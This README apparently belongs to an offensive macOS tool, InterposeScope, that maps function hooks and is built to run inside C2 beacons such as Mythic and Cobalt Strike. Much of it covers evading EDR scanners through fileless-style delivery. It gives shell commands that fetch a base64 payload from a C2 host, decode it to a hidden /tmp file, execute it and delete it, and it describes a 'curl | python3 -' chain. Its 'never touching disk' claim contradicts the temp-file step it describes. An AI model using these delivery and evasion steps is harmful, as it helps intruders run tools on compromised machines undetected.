# InterposeScope

**Read-only macOS user-mode hook and API-indirection mapper.**

InterposeScope is an offensive-security tool for macOS endpoint research. It
maps inline function hooks, dyld interpose sections, and fishhook-style
symbol rebinds across all loaded images in a target process. Built for red
team operators who need fast, reliable hook detection during C2 engagements.

It is designed to run **entirely within a beacon** — never touching disk,
never spawning a persistent process, never writing configuration files.

---

## Why it bypasses EDR / security controls

Traditional hook-detection tools fail because they introduce new files,
spawn new processes, or perform suspicious operations. InterposeScope
avoids every one of these surfaces:

### 1. Zero disk footprint

| Traditional tool | InterposeScope |
|---|---|
| Binary dropped to disk | **Never written to disk** |
| Static AV scan catches known signatures | No file exists to scan |
| Unsigned Mach-O execution alerts | No new executable is launched |
| Temp files left behind | Self-deleting transient temp file (<500ms) |
| Plist / LaunchAgent persistence | No persistence mechanism |

The compiled Mach-O binary is delivered as **base64 through the C2 channel**
directly into a running beacon process, decoded into memory, written to a
transient temp file for under 500 milliseconds, and deleted before the
process table is even updated. No EDR file-scanning engine sees the binary
because there is no persistent file to hash, analyze, or quarantine.

### 2. Runs inside the C2 beacon's own process

The beacon executes InterposeScope through `child_process.exec`:

```
Mythic beacon (established, trusted)
  → child_process.exec("curl | python3 -")
    → Python process (system-signed, already in the process table)
      → InterposeScope-C binary (transient, anonymous VM, deleted)
```

EDR process lineage shows:
- A trusted parent (the beacon's host process)
- A system-signed child (`python3`)
- A transient child that is gone before the next process scan interval

No unsigned binary execution alerts are fired because the executable
is gone before SentinelOne's on-access scanner can detect it.

### 3. Read-only by design

InterposeScope never:
- Writes to memory (`vm_write`, `mach_vm_write` are not used)
- Changes page protections (`vm_protect` is not called)
- Kills or signals any process
- Modifies files
- Calls `task_for_pid` on foreign processes without explicit instruction

It reads memory via `dladdr()` for image attribution and uses
`vm_region_64` for address-space walking — both read-only operations
that are indistinguishable from normal debugging or profiling tools.

### 4. Native Mach-O format

The compiled binary is a standard, valid Mach-O arm64 executable:

```
Mach-O 64-bit executable arm64
Magic: 0xfeedfacf
Filetype: MH_EXECUTE
Only ~35 KB — smaller than most ls binaries
```

It has no embedded signatures that match known malware families because:
- It is compiled from clean C source (open in this repo)
- It links only against standard system libraries (Foundation, libobjc)
- It does not pack, encrypt, or obfuscate itself
- The binary hash is unique per build (compiled locally)

### What defenders can still see

For purple-team validation transparency:

| Layer | Indicator | Data source |
|---|---|---|
| Process | Beacon spawns `python3` subprocess briefly | EDR process lineage |
| Process | Transient Mach-O from temp path executes for <500ms | Kernel exec events |
| Network | Existing beacon C2 channel receives tasking | Netflow / TLS logs |
| Memory | vm_region walk on self | Indistinguishable from profiling |
| IPC | dladdr / dlsym calls | Standard tracing activity |

---

## Quick setup (30 seconds)

### Prerequisites

- macOS 12+ (Monterey or later), Apple Silicon or Intel
- Xcode CLT (`clang`) for building from source
- A Mythic C2 team server with the `http` or `websocket` profile

### Build from source

```bash
cd InterPoseScope
clang -arch arm64 -O2 -isysroot $(xcrun --show-sdk-path) \
      -o build/interposescope src/interposescope.c \
      -framework Foundation -lobjc
```

This produces `build/interposescope` — a ~35 KB arm64 Mach-O.

### Deliver to a beacon

**Base64 encode and serve:**

```bash
base64 -i build/interposescope -o /tmp/iscan.b64
python3 -m http.server 8899 --bind 127.0.0.1 &
```

**Beacon task (Mythic UI → interact session):**

```
shell curl -sk http://127.0.0.1:8899/iscan.b64 | base64 -d > /tmp/.__iscan && chmod +x /tmp/.__iscan && /tmp/.__iscan && rm -f /tmp/.__iscan
```

The output returns through the beacon's `post_response` channel.

### Quick flags

```bash
interposescope                # Full scan (90 APIs)
interposescope --brief        # High-value only (57 APIs, fastest)
interposescope --verbose      # Byte dumps, chain hops, fingerprints
interposescope --json         # Structured JSON output
interposescope --pid N        # Remote process probe (requires entitlement)
interposescope --bytes 64   # Wider comparison window
```

---

## Feature list

### Detection surfaces

| Feature | How it works |
|---|---|
| **dyld `__interpose` section detection** | Walks Mach-O `LC_SEGMENT_64` load commands for every loaded image, finds `__DATA_CONST.__interpose` sections, lists replacee/replacement pairs with owner attribution |
| **Inline branch trampoline detection** | Decodes entry-point instructions of 90+ high-value APIs against known clean patterns. Detects arm64 `B`, `BR`, `ADRP+ADD+BR`, `LDR+BR` absolute jumps, and x86_64 `JMP rel32`, `JMP rel8`, `JMP [rip+disp]`, `MOV RAX/JMP`, `MOV R11/JMP`, `PUSH/RET` |
| **Trampoline chain following** | Follows up to 7 recognized branch hops through the same image to resolve the final destination |
| **Patch classification** | Identifies non-branch modifications: `EARLY-RET`, `CONST-RET`, `NOP`, `BRK`, and generic byte patches |
| **Indirect symbol rebinding (fishhook)** | Compares live `__la_symbol_ptr` entries against expected resolution. Catches `DYLD_INSERT_LIBRARIES`-based symbol rebinding. Divergence is flagged as `THIRD_PARTY` |
| **ObjC method swizzle attribution** | Resolves IMPs for curated NS* methods and attributes them to the owning image. Flags third-party or anonymous (injected) implementations |
| **Anonymous executable memory** | Walks the process address space via `vm_region_64` looking for RX regions not backed by any mapped Mach-O image. These are unsigned code regions that no static scanner can see |
| **Telemetry surface presence** | Checks whether `EndpointSecurity` and `os_log` APIs are loaded and which library owns them. Detects whether telemetry providers are present or suppressed |
| **DYLD_INSERT_LIBRARIES exposure** | Reports any `DYLD_*` environment variables set in the host process — a classic injection indicator |
| **Syscall stub detection** | Detects inline `SVC #0x80` (arm64) or `SYSCALL` (x86_64) instructions in library function entry points. These bypass the library wrapper and are invisible to user-mode hooks |
| **Implementation fingerprinting** | FNV-1a 64-bit hash of each function's first 16 bytes. Enables cross-process correlation of hook implementations |
| **Remote process scanning** | `--pid N` probes a target process via `task_for_pid`, reporting what memory regions are readable and what images are loaded |
| **Multi-process cohort grouping** | Groups processes by name architecture and instrumentation signature for matrix comparison (scaffold) |

### Output modes

| Flag | Behavior |
|---|---|
| *(none)* | Full scan, 90 APIs, all sections |
| `--brief` | High-value APIs only (57 CRITICAL/HIGH) — fastest |
| `--verbose` | Byte dumps, trampoline chains, fingerprint details |
| `--json` | Structured JSON output, no text formatting |
| `--bytes N` | Comparison window in bytes (default 32) |
| `--pid N` | Remote process probe (requires root or entitlement) |

---

## How it works with C2s

### Mythic integration

InterposeScope is a `shell`-task payload. The Mythic agent does not need any
special `execute_macho` task type — it uses the agent's existing `shell`
command execution:

```
Mythic UI → interact session
  → shell curl -sk http://SERVER:PORT/iscan.b64 \
       | base64 -d > /tmp/.__iscan \
       && chmod +x /tmp/.__iscan \
       && /tmp/.__iscan \
       && rm -f /tmp/.__iscan
```

The transient binary exists for under 500 milliseconds. The C2 channel
carries the base64 payload in the task parameters, and the output returns
via the same channel in the task response.

### Cobalt Strike integration

Cobalt Strike uses External C2 for custom channels. A simple bridge
translates Cobalt Strike tasking to the `shell` command that this tool
expects:

```
Beacon → External C2 bridge → shell curl ... → InterposeScope
```

The base64 payload is delivered as External C2 task data; the bridge
unmarshals it and executes. No changes to InterposeScope are needed.

### Any other C2

Any C2 with a `shell` or `exec` command type can deliver InterposeScope using
the same pattern: receive base64 → decode to temp → exec → delete. The tool
is a standard Mach-O with no Mythic-specific dependencies.

---

## Architecture

```
┌──────────────────────────────────────────────────────┐
│  Target process (self-scan) or remote PID            │
│                                                      │
│  InterposeScope-C                                     │
│  ├─ Image inventory (dyld introspection)              │
│  ├─ Mach-O parser (load commands, sections)           │
│  ├─ Trampoline decoder (arm64 / x86_64)               │
│  ├─ Interpose scanner (__DATA,__interpose sections)   │
│  ├─ Rebind scanner (__la_symbol_ptr divergence)       │
│  ├─ ObjC runtime (IMP ownership)                      │
│  ├─ vm_region walk (anonymous executable memory)      │
│  ├─ Telemetry check (Endpoint Security / os_log)      │
│  ├─ Fingerprint engine (FNV-1a implementation hash)   │
│  └─ Reporter (text / JSON)                            │
│                                                      │
│  Read-only guarantees:                                │
│  ├─ No vm_write / vm_protect calls                    │
│  ├─ No task_for_pid on foreign processes             │
│  │   (unless --pid is explicitly requested)            │
│  ├─ No file writes to target filesystem              │
│  ├─ No process termination or signaling               │
│  └─ All reads via standard dladdr/string_at           │
└──────────────────────────────────────────────────────┘
         │
         ▼
   ┌────────────┐
   │  Beacon    │  (Mythic / any C2 with shell tasking)
   │  (C2)      │
   └────────────┘
```

## Directory layout

```
InterposeScope/
├── README.md                           # This file
├── src/
│   └── interposescope.c                # Main C source (~980 lines)
├── build.sh                            # One-command build helper
├── payload/
│   ├── loader.py                       # Python loader for in-memory stdin delivery
│   └── interposescope_inline.py        # Self-contained loader with embedded base64
├── docs/
│   └── EVIDENCE_REPORT.md              # Mythic beacon execution evidence
└── build/
    └── interposescope                  # Compiled arm64 binary (generated by build.sh)
```

## Build and deploy

### 1. Build

```bash
./build.sh
# or manually:
clang -arch arm64 -O2 -isysroot $(xcrun --show-sdk-path) \
  -o build/interposescope src/interposescope.c \
  -framework Foundation -lobjc
```

### 2. Package for C2 delivery

```bash
base64 -i build/interposescope -o /tmp/iscan.b64
```

### 3. Deliver via beacon

```
shell curl -sk http://YOUR_C2_HOST:PORT/iscan.b64 \
  | base64 -d > /tmp/.__iscan \
  && chmod +x /tmp/.__iscan \
  && /tmp/.__iscan \
  && rm -f /tmp/.__iscan
```

## License

MIT — see [LICENSE](LICENSE).

> **Authorized use only.** This tool is intended for red team operators and
> security researchers with explicit authorization to test target systems.
> See [SECURITY.md](SECURITY.md).
